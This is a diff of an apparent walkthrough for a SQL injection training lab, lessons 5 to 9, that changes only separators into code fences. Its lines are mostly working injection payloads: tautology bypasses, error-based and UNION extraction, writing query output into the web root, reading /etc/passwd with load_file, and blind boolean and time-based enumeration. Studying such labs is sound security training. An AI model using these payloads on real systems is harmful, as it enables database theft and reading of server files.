@@ -2,26 +2,26 @@
 
 
 ### Lesson 5
----
+```	
 ?id=' or 1=1--+
 ?id=' or '1'='1
 ?id=' or 1=1%23
----
+```	
 
 ### Lesson 6
 
----
+```	
 ?id=1" or 1=1--+
 ?id=1" or "1"="1
 ?id=1" or 1=1%23
 
 
 For example, to get the database name: ?id=1' and (select 1 from (select count(*),concat(database(),floor(rand()*2))a from information_schema.tables group by a)b)--+
----
+```	
 
 ### Lesson 7
 
----
+```	
 ?id=1')) UNION SELECT(select database()),2,3 into outfile "/var/www/html/sqli/Less-7/1.txt";--+ Content of 1.txt: 
 
 Get all table names of 'security':
@@ -40,12 +40,12 @@ Also can load_file("/etc/passwd") to dump the passwd file:
 ?id=1')) union select load_file("/etc/passwd"),2,3 into outfile "/var/www/html/sqli/Less-7/5.txt";--+
 
 
----
+```	
 
 ###  Lesson-8 (Blind SQLi+)
 
 
----
+```	
 ?id=1' and (select substr(version(),1,1))<6--+
 ?id=1' and (select substr(version(),1,1))<5--+
 ?id=1' and (select substr(version(),1,1))=5--+
@@ -68,11 +68,11 @@ Get columns
 
 ?id=1' AND (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))=ascii('i'))--+
 
----
+```	
 
 ### Lesson-9 ( Time-based SQLi)
 
----
+```	
 Basic query to detect sqli+
 
 ?id=1' and sleep(10)--+
@@ -85,4 +85,4 @@ Get database
 
 ?id=1' and if(substr(database(),1,1)='s', sleep(10),null)--+
 
----
+```	
